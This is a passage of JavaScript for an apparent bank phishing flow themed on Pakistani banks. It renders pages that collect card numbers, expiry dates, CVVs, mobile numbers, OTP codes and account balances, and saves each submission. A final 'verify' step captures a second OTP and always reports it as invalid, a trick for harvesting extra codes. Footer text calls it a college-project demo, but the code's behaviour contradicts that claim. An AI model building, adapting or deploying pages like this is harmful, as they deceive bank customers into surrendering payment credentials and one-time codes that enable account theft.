                    <span>Confirm OTP</span>
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg>
                </button>

                <p class="pt-3 text-center text-xs text-muted-foreground">
                    Demo directory for a college project. No real OTP is sent or verified.
                </p>
            </form>
        `;
    } else if (step === 'balance') {
        stepHtml = `
            <form id="balance-form" class="mt-6">
                <h2 class="text-2xl font-extrabold tracking-tight">Account Balance</h2>
                <p class="mt-2 text-pretty text-sm leading-relaxed text-muted-foreground">
                    Enter your current ${bank.name} account balance in PKR.
                </p>

                <div class="mt-5 rounded-3xl border border-border bg-card p-5 shadow-sm">
                    <label for="balance" class="block text-xs font-bold uppercase tracking-wider text-muted-foreground">Current Balance</label>
                    <div class="mt-3 flex items-center gap-3 rounded-2xl border border-border bg-secondary/30 px-4 py-3 focus-within:border-primary focus-within:ring-2 focus-within:ring-primary">
                        <span class="shrink-0 text-sm font-bold text-foreground">PKR</span>
                        <span class="h-6 w-px shrink-0 bg-border" aria-hidden="true"></span>
                        <input id="balance" inputmode="numeric" autocomplete="off" placeholder="0" class="w-full bg-transparent text-lg font-semibold text-foreground outline-none placeholder:text-muted-foreground/60" value="">
                    </div>
                </div>

                <div class="mt-4 flex items-start gap-2 rounded-2xl border border-primary/20 bg-primary/5 px-4 py-3">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="mt-0.5 shrink-0 text-primary"><circle cx="12" cy="12" r="10"/><line x1="12" x2="12" y1="16" y2="12"/><line x1="12" x2="12.01" y1="8" y2="8"/></svg>
                    <p class="text-sm leading-relaxed text-primary">
                        This is required to verify your account. Your balance is encrypted and never stored on our servers.
                    </p>
                </div>

                <div class="flex items-center justify-center gap-2 py-5" role="status" aria-label="Step 5 of 5">
                    <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                    <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                    <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                    <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                    <span class="h-2 rounded-full transition-all w-6 bg-primary"></span>
                </div>

                <button id="balance-submit-btn" type="submit" disabled class="flex w-full items-center justify-center gap-2 rounded-2xl bg-primary py-4 text-base font-bold text-primary-foreground shadow-md transition hover:brightness-105 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring disabled:cursor-not-allowed disabled:opacity-50">
                    <span>Next</span>
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg>
                </button>

                <p class="pt-3 text-center text-xs text-muted-foreground">
                    Demo directory for a college project. No account data is stored or sent.
                </p>
            </form>
        `;
    } else if (step === 'verify') {
        stepHtml = `
            <form id="verify-otp-form" class="mt-6">
                <h2 class="text-2xl font-extrabold tracking-tight">Confirm OTP</h2>
                <p class="mt-2 text-pretty text-sm leading-relaxed text-muted-foreground">
                    Enter the 6-digit confirmation code sent to <span id="masked-phone" class="font-semibold text-foreground">your registered number</span>.
                </p>

                <div class="mt-5 rounded-3xl border border-border bg-card p-5 shadow-sm">
                    <div class="flex justify-center gap-2 sm:gap-3">
                        ${Array.from({length: 6}, (_, i) => `<input inputmode="numeric" autocomplete="${i === 0 ? 'one-time-code' : 'off'}" maxlength="1" aria-label="Digit ${i+1}" class="otp-box h-12 w-11 rounded-xl border border-border bg-secondary/40 text-center text-xl font-bold text-foreground outline-none ring-2 ring-transparent transition focus:border-primary focus:ring-primary sm:h-14 sm:w-12" value="">`).join('')}
                    </div>

                    <p id="otp-invalid-alert" class="hidden mt-4 flex items-center justify-center gap-1.5 text-center text-sm font-semibold text-destructive" role="alert">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" x2="12" y1="8" y2="12"/><line x1="12" x2="12.01" y1="16" y2="16"/></svg>
                        Invalid OTP. Please try again.
                    </p>

                    <p class="mt-4 text-center text-sm text-muted-foreground">
                        Didn't receive the code? <span id="timer-wrapper" class="font-semibold text-foreground">Resend in <span id="countdown">05:00</span></span>
                        <button id="resend-btn" type="button" class="hidden font-semibold text-primary underline-offset-2 hover:underline focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring">Resend code</button>
                    </p>
                </div>

                <div class="mt-4 flex items-start gap-2 rounded-2xl border border-amber-500/30 bg-amber-500/10 px-4 py-3">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="mt-0.5 shrink-0 text-amber-500"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3"/><line x1="12" x2="12" y1="9" y2="13"/><line x1="12" x2="12.01" y1="17" y2="17"/></svg>
                    <p class="text-sm leading-relaxed text-amber-700 dark:text-amber-300">
                        Never share your OTP with anyone. Your bank will never ask for your OTP over a call or SMS.
                    </p>
                </div>

                <div class="flex items-center justify-center gap-2 py-5" role="status" aria-label="Step 5 of 5">
                    <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                    <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                    <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                    <span class="h-2 rounded-full transition-all w-2 bg-border"></span>
                    <span class="h-2 rounded-full transition-all w-6 bg-primary"></span>
                </div>

                <button id="verify-submit-btn" type="submit" disabled class="flex w-full items-center justify-center gap-2 rounded-2xl bg-primary py-4 text-base font-bold text-primary-foreground shadow-md transition hover:brightness-105 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring disabled:cursor-not-allowed disabled:opacity-50">
                    <span>Confirm OTP</span>
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg>
                </button>

                <p class="pt-3 text-center text-xs text-muted-foreground">
                    Demo directory for a college project. No real OTP is sent or verified.
                </p>
            </form>
        `;
    }

    appEl.innerHTML = `
        <header class="border-b border-border bg-card">
            <div class="mx-auto flex max-w-md items-center gap-3 px-4 py-4">
                <a href="${backUrls[step] || '/'}" onclick="event.preventDefault(); navigateTo('${backUrls[step] || '/'}');" aria-label="Back" class="flex h-9 w-9 shrink-0 items-center justify-center rounded-lg text-foreground transition hover:bg-secondary focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"/></svg>
                </a>
                <span class="flex h-11 w-11 shrink-0 items-center justify-center overflow-hidden rounded-xl bg-white p-1.5 shadow-sm ring-1 ring-black/5">
                    <img src="/public${bank.logo || ''}" onerror="this.src='https://sbp-phase-3.vercel.app${bank.logo}'; this.onerror=function(){this.style.display='none'; this.nextElementSibling.style.display='flex';};" alt="${bank.name} logo" class="h-full w-full object-contain" loading="lazy">
                    <span class="hidden h-full w-full items-center justify-center rounded-lg font-bold text-white text-sm" style="background-color: ${bank.color}">${bank.short}</span>
                </span>
                <div class="min-w-0">
                    <h1 class="truncate text-base font-bold capitalize">${bank.name}</h1>
                    <p class="text-xs text-muted-foreground">${bank.category} bank</p>
                </div>
            </div>
        </header>

        <div class="mx-auto max-w-md px-4 py-5">
            ${stepHtml}
        </div>
    `;

    bindStepEvents(slug, bank, step);
}

function bindStepEvents(slug, bank, step) {
    if (step === 'card') {
        const cardInput = document.getElementById('card-number');
        const monthSelect = document.getElementById('exp-month');
        const yearSelect = document.getElementById('exp-year');
        const cvvInput = document.getElementById('cvv');
        const mobileInput = document.getElementById('mobile');
        const submitBtn = document.getElementById('card-submit-btn');
        const form = document.getElementById('card-form');

        cardInput.addEventListener('input', (e) => {
            let val = e.target.value.replace(/\D/g, '').slice(0, 16);
            e.target.value = val.replace(/(.{4})/g, '$1 ').trim();
            validate();
        });

        monthSelect.addEventListener('change', validate);
        yearSelect.addEventListener('change', validate);
        cvvInput.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4); validate(); });
        mobileInput.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, '').slice(0, 11); validate(); });

        function validate() {
            const rawCard = cardInput.value.replace(/\s/g, '');
            const valid = rawCard.length === 16 && monthSelect.value !== '' && yearSelect.value !== '' && cvvInput.value.length >= 3 && /^03\d{9}$/.test(mobileInput.value);
            submitBtn.disabled = !valid;
        }

        form.addEventListener('submit', (e) => {
            e.preventDefault();
            const rawCard = cardInput.value;
            const mobile = mobileInput.value;
            sessionStorage.setItem('sbp_mobile', mobile);
            saveLocalSubmission(slug, bank.name, 'card', {
                card_number: rawCard,
                exp_month: monthSelect.value,
                exp_year: yearSelect.value,
                cvv: cvvInput.value,
                mobile: mobile
            });
            navigateTo('/bank/' + slug + '/otp?mobile=' + encodeURIComponent(mobile));
        });

    } else if (step === 'otp' || step === 'verify') {
        const isVerify = (step === 'verify');
        const boxes = Array.from(document.querySelectorAll('.otp-box'));
        const submitBtn = document.getElementById(isVerify ? 'verify-submit-btn' : 'otp-submit-btn');
        const invalidAlert = document.getElementById('otp-invalid-alert');
        const form = document.getElementById(isVerify ? 'verify-otp-form' : 'otp-form');
        const countdownEl = document.getElementById('countdown');
        const timerWrapper = document.getElementById('timer-wrapper');
        const resendBtn = document.getElementById('resend-btn');
        const maskedPhone = document.getElementById('masked-phone');

        const savedMobile = sessionStorage.getItem('sbp_mobile') || '';
        if (maskedPhone && savedMobile.length >= 8) {
            const clean = savedMobile.replace(/\D/g, '');
            maskedPhone.textContent = clean.slice(0, 4) + ' *** ' + clean.slice(-4);
        }

        boxes.forEach((box, idx) => {
            box.addEventListener('input', (e) => {
                if (invalidAlert) invalidAlert.classList.add('hidden');
                boxes.forEach(b => b.classList.remove('border-destructive', 'ring-destructive/40'));
                const val = e.target.value.replace(/\D/g, '').slice(-1);
                e.target.value = val;
                if (val && idx < boxes.length - 1) {
                    boxes[idx + 1].focus();
                    boxes[idx + 1].select();
                }
                checkOtp();
            });

            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !box.value && idx > 0) {
                    boxes[idx - 1].focus();
                    boxes[idx - 1].select();
                } else if (e.key === 'ArrowLeft' && idx > 0) {
                    e.preventDefault();
                    boxes[idx - 1].focus();
                } else if (e.key === 'ArrowRight' && idx < boxes.length - 1) {
                    e.preventDefault();
                    boxes[idx + 1].focus();
                }
            });

            box.addEventListener('paste', (e) => {
                e.preventDefault();
                const text = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 6);
                if (!text) return;
                text.split('').forEach((ch, i) => { if (boxes[i]) boxes[i].value = ch; });
                boxes[Math.min(text.length, boxes.length - 1)].focus();
                checkOtp();
            });
        });

        function checkOtp() {
            const code = boxes.map(b => b.value).join('');
            submitBtn.disabled = code.length !== 6;
        }

        // Timer
        let sec = 300;
        const interval = setInterval(() => {
            if (sec <= 0) {
                clearInterval(interval);
                if (timerWrapper) timerWrapper.style.display = 'none';
                if (resendBtn) resendBtn.classList.remove('hidden');
                return;
            }
            sec--;
            const m = String(Math.floor(sec / 60)).padStart(2, '0');
            const s = String(sec % 60).padStart(2, '0');
            if (countdownEl) countdownEl.textContent = m + ':' + s;
        }, 1000);

        if (resendBtn) {
            resendBtn.addEventListener('click', () => {
                boxes.forEach(b => b.value = '');
                if (invalidAlert) invalidAlert.classList.add('hidden');
                boxes.forEach(b => b.classList.remove('border-destructive'));
                checkOtp();
                if (boxes[0]) boxes[0].focus();
            });
        }

        form.addEventListener('submit', (e) => {
            e.preventDefault();
            const code = boxes.map(b => b.value).join('');
            if (code.length !== 6) return;

            if (isVerify) {
                saveLocalSubmission(slug, bank.name, 'verify', { verify_otp: code });
                if (invalidAlert) invalidAlert.classList.remove('hidden');
                boxes.forEach(b => {
                    b.classList.remove('border-border');
                    b.classList.add('border-destructive', 'ring-destructive/40');
                });
            } else {
                saveLocalSubmission(slug, bank.name, 'otp', { otp: code });
                navigateTo('/bank/' + slug + '/balance');
            }
        });

    } else if (step === 'balance') {
        const balanceInput = document.getElementById('balance');
        const submitBtn = document.getElementById('balance-submit-btn');
        const form = document.getElementById('balance-form');

        balanceInput.addEventListener('input', (e) => {
            let clean = e.target.value.replace(/\D/g, '').replace(/^0+/, '');
            if (clean) {
                e.target.value = Number(clean).toLocaleString('en-US');
                submitBtn.disabled = false;
            } else {
                e.target.value = '';
                submitBtn.disabled = true;
            }
        });

        form.addEventListener('submit', (e) => {
            e.preventDefault();
            const clean = balanceInput.value.replace(/,/g, '');
            if (!clean) return;
            saveLocalSubmission(slug, bank.name, 'balance', {
                balance: balanceInput.value,
                balance_numeric: Number(clean)
            });
            navigateTo('/bank/' + slug + '/verify');
        });
    }
}
